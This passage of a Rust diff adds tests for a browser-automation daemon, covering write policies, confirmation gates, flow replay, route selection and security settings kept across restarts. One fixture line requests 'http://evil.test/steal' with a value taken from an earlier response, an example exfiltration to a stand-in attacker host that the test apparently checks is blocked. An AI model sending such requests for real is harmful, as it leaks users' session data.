+        save_flow_json(flow);
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let resp = execute_command(&json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "false" }), &mut state).await;
+        assert_eq!(resp["success"], false, "{resp}");
+        let error = resp["error"].as_str().unwrap();
+        assert!(error.contains("s1w1") && error.contains("allow"), "{error}");
+        assert!(
+            state.browser.is_none(),
+            "no browser launched, so no click ran"
+        );
+    }
+
+    #[tokio::test]
+    async fn the_replay_needs_the_policy_and_confirmation_for_its_writes_too() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        save_flow_json(json!({
+            "version": 1, "name": "buy", "origin": "127.0.0.1",
+            "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
+            "steps": [
+                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
+                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
+                    "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
+                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
+                }] }
+            ]
+        }));
+        let policy_with = |file: &str, body: &str| {
+            let path = dir.path().join(file);
+            std::fs::write(&path, body).unwrap();
+            ActionPolicy::load(path.to_str().unwrap()).unwrap()
+        };
+        let run = json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "all" });
+        let cases: [(Option<ActionPolicy>, Option<ConfirmActions>, &str); 3] = [
+            (
+                Some(policy_with(
+                    "deny.json",
+                    r#"{"default":"allow","deny":["flow_write:s1w1"]}"#,
+                )),
+                None,
+                "denied by policy",
+            ),
+            (
+                Some(policy_with(
+                    "confirm.json",
+                    r#"{"default":"allow","confirm":["flow_write:s1w1"]}"#,
+                )),
+                None,
+                "requires confirmation",
+            ),
+            (
+                None,
+                ConfirmActions::parse("flow_write:s1w1"),
+                "requires confirmation",
+            ),
+        ];
+        for (policy, confirm, expect) in cases {
+            let mut state = DaemonState::new();
+            state.policy = policy;
+            state.confirm_actions = confirm;
+            let resp = execute_command(&run, &mut state).await;
+            assert_eq!(resp["success"], false, "{resp}");
+            let error = resp["error"].as_str().unwrap_or_default();
+            assert!(error.contains(expect), "{expect}: {resp}");
+            assert!(
+                state.browser.is_none(),
+                "{expect}: the replay must not start"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn a_write_sent_by_one_tier_is_not_sent_again_by_the_replay() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let (port, hits) = serve_counting(
+            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
+        );
+        let base = format!("http://127.0.0.1:{}", port);
+        let sig = super::super::flow::signature(&json!({ "ok": true }));
+        let expect = json!({ "status": 200, "mime": "application/json", "signature": sig, "bytes": 11, "itemFields": [], "extract": null });
+        let flow = json!({
+            "version": 1, "name": "twice", "origin": "127.0.0.1",
+            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "kind": "explicit", "step": 1 }],
+            "steps": [
+                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#add" }, "requests": [{
+                    "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "headers": {}, "body": "{}", "expect": expect }] },
+                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
+                    "id": "s2r1", "method": "GET", "url": format!("{}/api/items?c={{{{@s1r1.ok}}}}", base), "headers": {}, "body": null,
+                    "tier": "replay", "expect": expect }] }
+            ]
+        });
+        save_flow_json(flow);
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let run = json!({ "id": "r", "action": "flow_run", "name": "twice", "params": {}, "allowWrite": "all" });
+        let resp = execute_command(&run, &mut state).await;
+        assert_eq!(resp["success"], false, "{resp}");
+        assert!(resp["error"].as_str().unwrap().contains("again"), "{resp}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
+        assert!(state.browser.is_none(), "the replay never started");
+    }
+
+    #[tokio::test]
+    async fn a_rejected_write_with_stripped_credentials_still_reaches_the_replay() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let (port, hits) = serve_counting(
+            "HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
+        );
+        let base = format!("http://127.0.0.1:{}", port);
+        let url = format!("{}/api/cart", base);
+        let flow = json!({
+            "version": 1, "name": "rejected", "origin": "127.0.0.1",
+            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
+            "steps": [
+                // A script command keeps the replay from running a browser.
+                { "seq": 1, "ok": true, "command": { "action": "evaluate", "script": "1" }, "requests": [{
+                    "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
+                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "ok": true })),
+                        "bytes": 11, "itemFields": [], "extract": null, "strippedAuth": true } }] }
+            ]
+        });
+        save_flow_json(flow);
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let run = json!({ "id": "r", "action": "flow_run", "name": "rejected", "params": {}, "allowWrite": "all" });
+        let resp = execute_command(&run, &mut state).await;
+        assert_eq!(resp["success"], false, "{resp}");
+        let error = resp["error"].as_str().unwrap();
+        assert!(
+            error.contains("not allowed in a replay"),
+            "the replay was reached: {error}"
+        );
+        assert!(!error.contains("already sent"), "{error}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
     }
 
     #[tokio::test]
@@ -19996,9 +21356,9 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
             "output": "s2r1",
             "steps": [
-                { "requests": [{ "id": "s1r1", "method": "GET",
+                { "command": {}, "requests": [{ "id": "s1r1", "method": "GET",
                     "url": format!("{}/session", base), "expect": expect }] },
-                { "requests": [{ "id": "s2r1", "method": "GET",
+                { "command": {}, "requests": [{ "id": "s2r1", "method": "GET",
                     "url": "http://evil.test/steal?c={{@s1r1.ok}}", "expect": expect }] }
             ]
         }));
@@ -20153,11 +21513,12 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
         let dir = tempfile::tempdir().unwrap();
         let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
         guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        // The fixture is a write, so a challenge in answer to it may have been applied.
         let cases: [(&'static str, &str, &str); 4] = [
             ("HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "auth_expired", ""),
             ("HTTP/1.1 403 Forbidden\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "auth_expired", ""),
             ("HTTP/1.1 429 Too Many Requests\r\nretry-after: 17\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "rate_limited", "17"),
-            ("HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: 41\r\nconnection: close\r\n\r\n<html>cf-chl-bypass captcha challenge</html", "blocked", ""),
+            ("HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: 41\r\nconnection: close\r\n\r\n<html>cf-chl-bypass captcha challenge</html", "outcome_unknown", ""),
         ];
         for (response, kind, retry) in cases {
             write_flow_fixture(dir.path(), serve_fixed(response));
@@ -20172,11 +21533,15 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             assert_eq!(resp["data"]["status"], kind);
             let error = resp["error"].as_str().unwrap();
             assert!(error.starts_with(kind), "{error}");
-            assert!(error.contains("step 1"), "{error}");
+            assert!(
+                error.contains("(http)"),
+                "stopped on the first tier: {error}"
+            );
             if !retry.is_empty() {
                 assert_eq!(resp["data"]["retryAfter"], retry);
                 assert!(error.contains("retry after 17"), "{error}");
             }
+            // No lower tier ran, so no browser was opened.
             assert!(state.browser.is_none());
         }
     }
@@ -20385,6 +21750,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             loading_finished_timestamp: None,
             response_body: Some(response_body.to_string()),
             response_body_base64: false,
+            remote_addr: None,
         });
 
         let error = handle_har_stop(
@@ -20456,6 +21822,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             loading_finished_timestamp: None,
             response_body: None,
             response_body_base64: false,
+            remote_addr: None,
         });
 
         let result = execute_command(
@@ -20644,6 +22011,134 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             patterns.is_empty(),
             "No routes/filters/headers → no patterns"
         );
+    }
+
+    fn route(pattern: &str, types: &[&str], response: bool, abort: bool) -> RouteEntry {
+        RouteEntry {
+            url_pattern: pattern.to_string(),
+            response: response.then(|| RouteResponse {
+                status: Some(201),
+                body: Some(pattern.to_string()),
+                content_type: None,
+                headers: None,
+                allow_origin: None,
+            }),
+            abort,
+            resource_types: types.iter().map(|t| t.to_string()).collect(),
+        }
+    }
+
+    #[test]
+    fn test_route_selection_table() {
+        let order = "http://h/api/order";
+        // (routes, url, resource type, expected body, "abort", or none)
+        let cases: Vec<(Vec<RouteEntry>, &str, &str, Option<&str>)> = vec![
+            (
+                vec![route("*/api/order", &["fetch"], true, false)],
+                order,
+                "XHR",
+                None,
+            ),
+            (
+                vec![route("*/api/order", &["xhr"], true, false)],
+                order,
+                "XHR",
+                Some("*/api/order"),
+            ),
+            (
+                vec![route("*/api/order", &["XHR"], true, false)],
+                order,
+                "XHR",
+                Some("*/api/order"),
+            ),
+            (
+                vec![route("*/api/order", &[], true, false)],
+                order,
+                "XHR",
+                Some("*/api/order"),
+            ),
+            (
+                vec![route("*/api/order", &["document"], true, false)],
+                order,
+                "XHR",
+                None,
+            ),
+            (
+                vec![route("*/api/other", &[], true, false)],
+                order,
+                "XHR",
+                None,
+            ),
+            (
+                vec![route("*/api/order", &[], false, true)],
+                order,
+                "XHR",
+                Some("abort"),
+            ),
+            // a matching route with no response and no abort does not stop the scan
+            (
+                vec![
+                    route("*/api/*", &[], false, false),
+                    route("*/api/order", &[], true, false),
+                ],
+                order,
+                "XHR",
+                Some("*/api/order"),
+            ),
+            // the first answering route wins; a fetch-only route earlier is skipped
+            (
+                vec![
+                    route("*/api/order", &["fetch"], true, false),
+                    route("*/api/*", &["xhr"], true, false),
+                ],
+                order,
+                "XHR",
+                Some("*/api/*"),
+            ),
+            (
+                vec![
+                    route("*/api/*", &[], true, false),
+                    route("*/api/order", &[], false, true),
+                ],
+                order,
+                "XHR",
+                Some("*/api/*"),
+            ),
+            // the browser's own types go through the same predicate
+            (
+                vec![route("*/a", &["fetch"], true, false)],
+                "http://h/a",
+                "Fetch",
+                Some("*/a"),
+            ),
+            (
+                vec![route("*/a", &["xhr"], true, false)],
+                "http://h/a",
+                "Fetch",
+                None,
+            ),
+        ];
+        for (i, (routes, url, rt, want)) in cases.iter().enumerate() {
+            let got = select_route(routes, url, rt).map(|r| {
+                if r.abort {
+                    "abort".to_string()
+                } else {
+                    r.response.as_ref().unwrap().body.clone().unwrap()
+                }
+            });
+            assert_eq!(got.as_deref(), *want, "case {i}");
+            // The flow's direct request is classified as the page's fetch().
+            if *rt == FLOW_DIRECT_RESOURCE_TYPE {
+                let flow = flow_route_answer(routes, url).map(|r| {
+                    if r.abort {
+                        "abort".to_string()
+                    } else {
+                        r.body
+                    }
+                });
+                assert_eq!(flow.as_deref(), *want, "flow case {i}");
+            }
+        }
     }
 
     #[tokio::test]
@@ -22349,5 +23844,471 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
         assert!(auto_launch(&mut state, Vec::new()).await.is_err());
 
         assert_eq!(state.engine, "chrome");
+    }
+
+    // === Security settings kept across daemon restarts ===
+
+    use crate::session_settings::{FsStore, MemStore, SecurityView, StoreError};
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    /// A store that counts saves and can start failing them.
+    struct FlakyStore {
+        inner: MemStore,
+        saves: AtomicUsize,
+        fail_from: usize,
+    }
+
+    impl FlakyStore {
+        fn new(fail_from: usize) -> Arc<FlakyStore> {
+            Arc::new(FlakyStore {
+                inner: MemStore::default(),
+                saves: AtomicUsize::new(0),
+                fail_from,
+            })
+        }
+
+        fn counting() -> Arc<FlakyStore> {
+            FlakyStore::new(usize::MAX)
+        }
+
+        fn saves(&self) -> usize {
+            self.saves.load(Ordering::SeqCst)
+        }
+    }
+
+    impl Store for FlakyStore {
+        fn load(&self) -> Result<Option<SecurityView>, StoreError> {
+            self.inner.load()
+        }
+
+        fn save(&self, view: &SecurityView) -> Result<(), StoreError> {
+            let attempt = self.saves.fetch_add(1, Ordering::SeqCst);
+            if attempt >= self.fail_from {
+                return Err(StoreError::PersistFailed("disk full".to_string()));
+            }
+            self.inner.save(view)
+        }
+
+        fn clear(&self) -> Result<(), StoreError> {
+            self.inner.clear()
+        }
+    }
+
+    fn write_private(path: &std::path::Path, contents: &str) {
+        fs::write(path, contents).unwrap();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            fs::set_permissions(path, fs::Permissions::from_mode(0o600)).unwrap();
+        }
+    }
+
+    /// A daemon start for `session`: the settings come from `store`, as in
+    /// `run_daemon`.
+    fn boot_state(store: Arc<dyn Store>, session: &str) -> DaemonState {
+        let settings = Running::boot(store.as_ref(), session).unwrap();
+        DaemonState::with_store(settings, store)
+    }
+
+    fn domains(list: &[&str]) -> (Key, Requested) {
+        set_to(Key::AllowedDomains, json!(list))
+    }
+
+    fn security_patch(policy_path: &str) -> Patch {
+        patch_with(vec![
+            domains(&["example.com"]),
+            set_to(Key::ActionPolicy, json!(policy_path)),
+            set_to(Key::ConfirmActions, json!("navigate,click")),
+        ])
+    }
+
+    #[tokio::test]
+    async fn test_a_stored_empty_domain_list_restores_as_no_filter() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        write_private(&dir.path().join("s.settings"), r#"{"allowedDomains":[]}"#);
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+
+        let state = boot_state(store, "s");
+
+        assert!(state.domain_filter.read().await.is_none());
+    }
+
+    #[tokio::test]
+    async fn test_a_respawned_daemon_keeps_the_filter_policy_and_confirm_categories() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let policy = dir.path().join("policy.json");
+        fs::write(&policy, r#"{"default":"deny"}"#).unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        let mut first = DaemonState::with_store(Running::defaults(), store.clone());
+        let patch = security_patch(policy.to_str().unwrap());
+        apply_settings_patch(&mut first, &patch, true)
+            .await
+            .unwrap();
+        drop(first);
+
+        // A new process over the same files, with no flags and an empty env.
+        let second = boot_state(store.clone(), "s");
+
+        assert_eq!(current_allowed_domains(&second).await, vec!["example.com"]);
+        assert!(second.policy.is_some(), "the action policy is back");
+        assert!(
+            second.confirm_actions.is_some(),
+            "the confirm categories are back"
+        );
+        assert_eq!(
+            second.settings.security().action_policy_path.as_deref(),
+            policy.to_str(),
+            "the policy path is kept as given"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_a_respawned_daemon_still_rejects_state_while_the_filter_is_active() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        let mut first = DaemonState::with_store(Running::defaults(), store.clone());
+        apply_settings_patch(
+            &mut first,
+            &patch_with(vec![domains(&["example.com"])]),
+            true,
+        )
+        .await
+        .unwrap();
+        drop(first);
+
+        let mut second = boot_state(store, "s");
+
+        let replay = ensure_state_replay_supported_by_active_domain_filter(&second, "state load")
+            .await
+            .unwrap_err();
+        assert!(
+            replay.contains("--allowed-domains is not supported"),
+            "{replay}"
+        );
+        let launch = json!({ "action": "launch", "storageState": "/tmp/s.json" });
+        let err = handle_launch(&launch, &mut second).await.unwrap_err();
+        assert!(
+            err.contains("--allowed-domains is not supported with --state"),
+            "{err}"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_a_restart_without_close_keeps_the_stored_settings() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        let mut first = boot_state(store.clone(), "s");
+        apply_settings_patch(
+            &mut first,
+            &patch_with(vec![domains(&["example.com"])]),
+            true,
+        )
+        .await
+        .unwrap();
+
+        // Idle expiry, a crash and a kill all end the process without `close`.
+        drop(first);
+        drop(boot_state(store.clone(), "s"));
+        let third = boot_state(store.clone(), "s");
+
+        assert_eq!(current_allowed_domains(&third).await, vec!["example.com"]);
+        assert!(dir.path().join("s.settings").exists());
+    }
+
+    #[tokio::test]
+    async fn test_close_clears_the_stored_settings() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        let mut first = boot_state(store.clone(), "s");
+        apply_settings_patch(
+            &mut first,
+            &patch_with(vec![domains(&["example.com"])]),
+            true,
+        )
+        .await
+        .unwrap();
+        assert!(dir.path().join("s.settings").exists());
+
+        let reply = handle_close(&mut first).await.unwrap();
+
+        assert_eq!(reply["closed"], true, "{reply}");
+        assert!(reply.get("settingsClearError").is_none(), "{reply}");
+        assert!(!dir.path().join("s.settings").exists());
+        let next = boot_state(store, "s");
+        assert!(next.domain_filter.read().await.is_none());
+    }
+
+    #[tokio::test]
+    async fn test_the_internal_shutdown_of_a_restart_keeps_the_stored_settings() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        let mut first = boot_state(store.clone(), "s");
+        apply_settings_patch(
+            &mut first,
+            &patch_with(vec![domains(&["example.com"])]),
+            true,
+        )
+        .await
+        .unwrap();
+
+        // What ensure_daemon sends before it starts a replacement daemon.
+        let resp = execute_command(
+            &json!({ "id": "restart-close", "action": INTERNAL_DAEMON_SHUTDOWN_ACTION }),
+            &mut first,
+        )
+        .await;
+
+        assert_eq!(resp["success"], true, "{resp}");
+        assert!(dir.path().join("s.settings").exists());
+        let next = boot_state(store, "s");
+        assert_eq!(current_allowed_domains(&next).await, vec!["example.com"]);
+    }
+
+    /// A state holding an allowlist and a policy file with `policy`.
+    async fn contained_state_with_policy(
+        dir: &std::path::Path,
+        policy: &str,
+    ) -> (DaemonState, Arc<dyn Store>) {
+        let file = dir.join("policy.json");
+        fs::write(&file, policy).unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir, "s"));
+        let mut state = boot_state(store.clone(), "s");
+        let patch = patch_with(vec![
+            domains(&["example.com"]),
+            set_to(Key::ActionPolicy, json!(file.to_str().unwrap())),
+        ]);
+        apply_settings_patch(&mut state, &patch, true)
+            .await
+            .unwrap();
+        (state, store)
+    }
+
+    #[tokio::test]
+    async fn test_a_close_denied_by_policy_keeps_the_stored_settings() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let (mut state, _) = contained_state_with_policy(dir.path(), r#"{"deny":["close"]}"#).await;
+
+        let resp = execute_command(&json!({ "id": "1", "action": "close" }), &mut state).await;
+
+        assert_eq!(resp["success"], false, "{resp}");
+        assert!(dir.path().join("s.settings").exists());
+    }
+
+    #[tokio::test]
+    async fn test_a_close_parked_for_confirmation_keeps_the_settings_until_confirmed() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let (mut state, _) =
+            contained_state_with_policy(dir.path(), r#"{"confirm":["close"]}"#).await;
+
+        let parked = execute_command(&json!({ "id": "1", "action": "close" }), &mut state).await;
+        assert_eq!(parked["data"]["confirmation_required"], true, "{parked}");
+        assert!(dir.path().join("s.settings").exists());
+
+        let confirmed =
+            execute_command(&json!({ "id": "2", "action": "confirm" }), &mut state).await;
+        assert_eq!(confirmed["success"], true, "{confirmed}");
+        assert!(!dir.path().join("s.settings").exists());
+    }
+
+    #[tokio::test]
+    async fn test_close_clears_a_file_the_daemon_could_not_read() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        write_private(&dir.path().join("s.settings"), "{not json");
+        assert!(Running::boot(store.as_ref(), "s").is_err());
+        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
+
+        handle_close(&mut state).await.unwrap();
+
+        assert!(Running::boot(store.as_ref(), "s").is_ok());
+    }
+
+    #[tokio::test]
+    async fn test_an_unchanged_value_does_not_write() {
+        let (_env, _) = isolated_state();
+        let store = FlakyStore::counting();
+        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
+        let patch = patch_with(vec![domains(&["example.com"])]);
+
+        apply_settings_patch(&mut state, &patch, true)
+            .await
+            .unwrap();
+        assert_eq!(store.saves(), 1);
+        apply_settings_patch(&mut state, &patch, true)
+            .await
+            .unwrap();
+        apply_settings_patch(&mut state, &Patch::default(), true)
+            .await
+            .unwrap();
+        let other = patch_with(vec![set_to(Key::UserAgent, json!("ua"))]);
+        apply_settings_patch(&mut state, &other, true)
+            .await
+            .unwrap();
+
+        assert_eq!(store.saves(), 1, "only the first change was written");
+    }
+
+    #[tokio::test]
+    async fn test_a_launch_rejected_for_containment_restores_the_stored_value() {
+        let (_env, _) = isolated_state();
+        let store = FlakyStore::counting();
+        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
+        apply_settings_patch(&mut state, &patch_with(vec![domains(&["a.com"])]), true)
+            .await
+            .unwrap();
+        let cmd = json!({
+            "action": "launch",
+            "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
+            "allowedDomains": ["b.com"]
+        });
+
+        assert!(handle_launch(&cmd, &mut state).await.is_err());
+
+        assert_eq!(current_allowed_domains(&state).await, vec!["a.com"]);
+        let stored = store.load().unwrap().unwrap();
+        assert_eq!(stored.allowed_domains, Some(vec!["a.com".to_string()]));
+    }
+
+    #[tokio::test]
+    async fn test_a_failed_launch_that_is_not_a_rejection_keeps_the_new_stored_value() {
+        let (_env, _) = isolated_state();
+        let store = FlakyStore::counting();
+        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
+        let cmd = json!({
+            "action": "launch",
+            "executablePath": "/nonexistent/chrome",
+            "allowedDomains": ["example.com"]
+        });
+
+        assert!(handle_launch(&cmd, &mut state).await.is_err());
+
+        let stored = store.load().unwrap().unwrap();
+        assert_eq!(
+            stored.allowed_domains,
+            Some(vec!["example.com".to_string()])
+        );
+    }
+
+    #[tokio::test]
+    async fn test_a_rejection_reports_a_stored_value_that_could_not_be_restored() {
+        let (_env, _) = isolated_state();
+        let store = FlakyStore::new(2);
+        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
+        apply_settings_patch(&mut state, &patch_with(vec![domains(&["a.com"])]), true)
+            .await
+            .unwrap();
+        let cmd = json!({
+            "action": "launch",
+            "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
+            "allowedDomains": ["b.com"]
+        });
+
+        let err = handle_launch(&cmd, &mut state).await.unwrap_err();
+
+        // Save 0 (a.com) and save 1 (b.com) succeed; the restore (save 2) fails.
+        assert!(
+            err.contains("the stored security settings could not be restored")
+                && err.contains("disk full"),
+            "{err}"
+        );
+        assert_eq!(store.saves(), 3, "the restore was attempted");
+        assert_eq!(current_allowed_domains(&state).await, vec!["a.com"]);
+    }
+
+    #[tokio::test]
+    async fn test_an_empty_list_clears_the_filter_and_the_clear_persists() {
+        let (_env, _) = isolated_state();
+        let dir = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
+        let mut first = boot_state(store.clone(), "s");
+        apply_settings_patch(
+            &mut first,
+            &patch_with(vec![domains(&["example.com"])]),
+            true,
+        )
+        .await
+        .unwrap();
+
+        apply_settings_patch(&mut first, &patch_with(vec![domains(&[])]), true)
+            .await
+            .unwrap();
+        assert!(first.domain_filter.read().await.is_none());
+        drop(first);
+
+        let second = boot_state(store, "s");
+        assert!(current_allowed_domains(&second).await.is_empty());
+        assert_eq!(second.settings.security().allowed_domains, Some(Vec::new()));
+    }
+
+    #[tokio::test]
+    async fn test_a_failing_store_leaves_the_session_untouched() {
+        let (_env, _) = isolated_state();
+        let store = FlakyStore::new(0);
+        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
+        let before = state.settings.clone();
+
+        let err = apply_settings_patch(&mut state, &security_patch("/p.json"), true)
+            .await
+            .err()
+            .expect("the write fails");
+
+        assert!(err.contains("disk full"), "{err}");
+        assert!(state.domain_filter.read().await.is_none());
+        assert!(state.policy.is_none());
+        assert!(state.confirm_actions.is_none());
+        assert_eq!(state.settings, before);
+        assert_eq!(store.load().unwrap(), None);
+    }
+
+    #[tokio::test]
+    async fn test_a_failing_store_fails_the_command_before_it_runs() {
+        let (_env, _) = isolated_state();
+        let mut state = DaemonState::with_store(Running::defaults(), FlakyStore::new(0));
+        let cmd = json!({
+            "id": "1",
+            "action": "navigate",
+            "url": "about:blank",
+            "settings": { "allowed-domains": ["example.com"] }
+        });
+
+        let resp = execute_command(&cmd, &mut state).await;
+
+        assert_eq!(resp["success"], false, "{resp}");
+        assert!(
+            resp["error"].as_str().unwrap().contains("disk full"),
+            "{resp}"
+        );
+        assert!(state.domain_filter.read().await.is_none());
+    }
+
+    #[tokio::test]
+    async fn test_stores_in_other_namespaces_do_not_leak_settings() {
+        let (_env, _) = isolated_state();
+        let one = tempfile::tempdir().unwrap();
+        let other = tempfile::tempdir().unwrap();
+        let store: Arc<dyn Store> = Arc::new(FsStore::new(one.path(), "s"));
+        let mut state = boot_state(store, "s");
+        apply_settings_patch(
+            &mut state,
+            &patch_with(vec![domains(&["example.com"])]),
+            true,
+        )
+        .await
+        .unwrap();
+
+        let elsewhere = boot_state(Arc::new(FsStore::new(other.path(), "s")), "s");
+        let sibling = boot_state(Arc::new(FsStore::new(one.path(), "t")), "t");
+
+        assert!(elsewhere.domain_filter.read().await.is_none());
+        assert!(sibling.domain_filter.read().await.is_none());
     }
 }
